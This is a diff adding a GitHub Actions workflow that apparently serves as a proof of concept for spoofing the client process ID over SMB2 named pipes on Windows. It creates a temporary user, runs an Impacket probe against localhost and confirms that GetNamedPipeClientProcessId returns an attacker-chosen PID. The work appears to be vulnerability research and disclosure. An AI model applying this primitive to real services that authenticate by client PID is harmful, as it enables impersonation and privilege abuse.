@@ -1,0 +1,54 @@
+name: Windows SMB2 named-pipe PID primitive proof
+
+on:
+  push:
+    branches:
+      - smb2-pid-primitive-proof-20260906
+
+permissions:
+  contents: read
+
+jobs:
+  prove:
+    runs-on: windows-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+      - name: Install Impacket
+        shell: pwsh
+        run: python -m pip install impacket==0.13.1
+      - name: Observe attacker-selected PID through the Windows API
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = "Stop"
+          $user = "pidproof"
+          $password = "PidProof-2026-Temporary!"
+          net user $user $password /add
+          if ($LASTEXITCODE -ne 0) { throw "failed to create temporary SMB user" }
+          Start-Service LanmanServer
+          Add-Type -Path proof/PidPipeServer.cs -OutputAssembly proof/PidPipeServer.exe -OutputType ConsoleApplication
+          $claimedPid = $PID
+          $server = Start-Process proof/PidPipeServer.exe -PassThru -RedirectStandardOutput proof/pid-server.log -RedirectStandardError proof/pid-server.err
+          Start-Sleep -Seconds 2
+          python proof/smb2_reserved_probe.py 127.0.0.1 --username $user --password $password --domain $env:COMPUTERNAME --pid $claimedPid | Tee-Object proof/pid-client.log
+          if ($LASTEXITCODE -ne 0) { throw "SMB2 client failed" }
+          $server.WaitForExit(10000) | Out-Null
+          $serverLog = Get-Content proof/pid-server.log -Raw
+          Write-Host $serverLog
+          if ($serverLog -notmatch "OBSERVED_CLIENT_PID=$claimedPid") {
+            throw "GetNamedPipeClientProcessId did not return the selected SMB2 value"
+          }
+          Write-Host "WINDOWS_SMB2_PID_SPOOF_CONFIRMED=$claimedPid"
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: smb2-pid-primitive-proof-${{ github.run_id }}
+          path: |
+            proof/*.log
+            proof/*.err
+          if-no-files-found: warn
+          retention-days: 7
